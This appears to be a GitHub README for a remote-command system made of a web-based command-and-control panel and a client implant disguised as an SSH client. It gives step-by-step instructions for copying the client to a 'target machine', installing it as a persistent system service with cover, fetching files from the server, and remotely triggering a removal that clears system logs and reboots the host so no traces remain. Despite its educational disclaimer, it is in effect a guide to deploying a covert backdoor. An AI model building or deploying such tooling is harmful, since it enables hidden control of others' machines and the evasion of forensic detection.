# Remote Command System

A web-based remote command execution system with SSH disguise capabilities. This system consists of two main components:

1. **Server**: A web interface for managing and executing remote commands
2. **Client**: A disguised SSH client that connects to the server and executes commands

## Features

### Server Features
- 🌐 Modern web interface for command management
- 📝 Save and organize commands and scripts
- 📁 File upload and management
- 🖥️ Real-time console with command execution
- 👥 Multi-client support
- 📊 Command history and logging
- 🔄 WebSocket support for real-time communication

### Client Features
- 🥷 SSH disguise - appears as legitimate SSH client
- 🔄 Auto-reconnection and heartbeat system
- 🚀 Background service mode
- 📡 WebSocket and HTTP communication
- 🛡️ System service integration
- 📱 Cross-platform support

## Installation

### Universal Server Setup (Works on Any System)

1. **Navigate to server directory:**
   ```bash
   cd server/
   ```

2. **Run the universal startup script:**
   ```bash
   ./start_universal.sh
   ```

3. **Access the web interface:**
   Open your browser to `http://localhost:5000`

The universal script will:
- Detect your system automatically
- Install Python dependencies
- Create virtual environment if possible
- Set up all necessary paths
- Start the server with proper configuration

### Universal Client Setup (Works on Any Linux System)

1. **Copy client files to target machine:**
   ```bash
   scp -r client/ user@target-machine:/tmp/
   ```

2. **On the target machine:**
   ```bash
   cd /tmp/client/
   ```

3. **Run the universal installer:**
   ```bash
   # For system-wide installation (recommended):
   sudo ./install_universal.sh
   
   # For user-only installation:
   ./install_universal.sh
   ```

4. **Update server URL:**
   ```bash
   # Edit the configuration file
   nano ~/.local/share/ssh-client/config.py  # (user install)
   # or
   nano /usr/share/ssh-client/config.py      # (system install)
   
   # Change SERVER_URL to your server's IP
   SERVER_URL = "http://YOUR_SERVER_IP:5000"
   ```

The universal installer will:
- Detect your Linux distribution
- Install SSH client as cover
- Set up Python environment
- Install as system service
- Create management tools
- Work with or without sudo privileges

### Quick System Test

Run the universal test script to verify compatibility:
```bash
./test_universal.sh
```

This will check:
- Python environment
- Package managers
- Network connectivity
- File permissions
- Port availability
- System compatibility

## Usage

### Web Interface

1. **Dashboard**: View all connected clients and their status
2. **Commands**: Create, save, and execute commands on remote clients
3. **Scripts**: Write and execute scripts (Bash, Python, PowerShell, etc.)
4. **Files**: Upload files and transfer them to remote clients
5. **Console**: Real-time command execution with live output

### Command Management

#### Adding Commands
- Navigate to the "Commands" tab
- Fill in the command name, actual command, and description
- Click "Save Command"

#### Executing Commands
- Select a command from the saved list
- Choose the target client from the dropdown
- Click "Execute"

#### Real-time Console
- Go to the "Console" tab
- Select a client
- Type commands and press Enter
- See real-time output

### Script Management

#### Creating Scripts
- Navigate to the "Scripts" tab
- Choose the script language (Bash, Python, PowerShell, Batch)
- Write your script content
- Add name and description
- Click "Save Script"

#### Running Scripts
- Select a script from the saved list
- Choose the target client
- Click "Execute"

### File Management

#### Uploading Files
- Go to the "Files" tab
- Drop files or click "Choose Files"
- Files are automatically uploaded to the server

#### Transferring Files
Files can be transferred to clients using commands like:
```bash
# Download from server
curl -o filename http://server:5000/api/files/FILE_ID

# Or using wget
wget -O filename http://server:5000/api/files/FILE_ID
```

## Security Considerations

⚠️ **Important Security Notes:**

1. **This system is for educational purposes and authorized penetration testing only**
2. **Never use this system without proper authorization**
3. **Change default configuration in production environments**
4. **Use HTTPS in production**
5. **Implement proper authentication and authorization**
6. **Monitor and log all activities**

## Configuration

Edit `config.py` to modify system settings:

- Server host and port
- Database configuration
- Security settings
- Client intervals
- SSH disguise settings

## Troubleshooting

### Server Issues

1. **Port already in use:**
   ```bash
   sudo netstat -tlnp | grep :5000
   sudo kill -9 PID
   ```

2. **Database issues:**
   ```bash
   rm remote_commands.db
   # Restart server to recreate database
   ```

3. **Permission errors:**
   ```bash
   sudo chown -R $USER:$USER server/
   ```

### Client Issues

1. **Service not starting:**
   ```bash
   sudo systemctl status ssh-client.service
   sudo journalctl -u ssh-client.service
   ```

2. **Connection issues:**
   ```bash
   # Check if server is reachable
   curl http://SERVER_IP:5000/api/clients
   
   # Check client logs
   sudo journalctl -u ssh-client.service -f
   ```

3. **Reinstall client:**
   ```bash
   sudo systemctl stop ssh-client.service
   sudo systemctl disable ssh-client.service
   sudo rm -rf /usr/share/openssh-client
   sudo rm /etc/systemd/system/ssh-client.service
   sudo systemctl daemon-reload
   # Then run install.sh again
   ```

## API Reference

### Client Registration
```
POST /api/client/register
{
    "client_id": "unique-client-id",
    "hostname": "client-hostname",
    "os_info": "OS information"
}
```

### Execute Command
```
POST /api/execute
{
    "client_id": "target-client-id",
    "command": "command-to-execute"
}
```

### Submit Result
```
POST /api/client/result
{
    "command_id": "command-id",
    "client_id": "client-id",
    "result": "command-output",
    "exit_code": 0
}
```

## Development

### Server Development
```bash
cd server/
python3 -m venv venv
source venv/bin/activate
pip install -r requirements.txt
python3 app.py
```

### Client Development
```bash
cd client/
python3 -m venv venv
source venv/bin/activate
pip install -r requirements.txt
python3 ssh_client.py
```

## File Structure

```
remote commands/
├── server/
│   ├── app.py                 # Main server application
│   ├── requirements.txt       # Python dependencies
│   ├── start.sh              # Server startup script
│   └── templates/
│       └── index.html        # Web interface
├── client/
│   ├── ssh_client.py         # Client disguise script
│   ├── requirements.txt      # Client dependencies
│   └── install.sh           # Client installation script
├── config.py                 # Configuration file
└── README.md                # This file
```

## Contributing

1. Fork the repository
2. Create a feature branch
3. Make your changes
4. Test thoroughly
5. Submit a pull request

## License

This project is for educational purposes only. Use responsibly and only on systems you own or have explicit permission to test.

## Disclaimer

This tool is designed for educational purposes and authorized security testing only. The authors are not responsible for any misuse or damage caused by this software. Always ensure you have proper authorization before using this tool on any system.

### Client Removal

The server includes a built-in client removal system that can completely remove clients without leaving traces:

#### From Web Interface
1. Navigate to the Dashboard
2. Find the client you want to remove
3. Click "🗑️ Remove Client"
4. Confirm the action (this will reboot the target machine)

#### Automatic Removal Script
The system automatically includes a removal script that:
- Stops all client services
- Removes all installed files
- Clears system logs
- Removes autostart entries
- Cleans temporary files
- Reboots the machine for complete cleanup

#### Manual Removal
For advanced users, use the standalone removal script:
```bash
# On the target machine
./scripts/advanced_removal.sh
```

## Docker Deployment

### Coolify Deployment

1. **Prepare for deployment:**
   ```bash
   ./deploy-coolify.sh
   ```

2. **Update domain in docker-compose.yml:**
   ```yaml
   - "traefik.http.routers.remote-command.rule=Host(`your-domain.com`)"
   ```

3. **Push to Git and deploy in Coolify**

### Manual Docker Deployment

1. **Build and run:**
   ```bash
   docker-compose up -d
   ```

2. **Access at http://localhost:5000**

### Environment Variables

```bash
FLASK_ENV=production
FLASK_DEBUG=false
FLASK_HOST=0.0.0.0
FLASK_PORT=5000
DB_PATH=/app/data/remote_commands.db
LOG_FILE=/app/logs/app.log
```



# Disclaimer
this is ai generated cuz i just wanted to test the idea to see if it was possible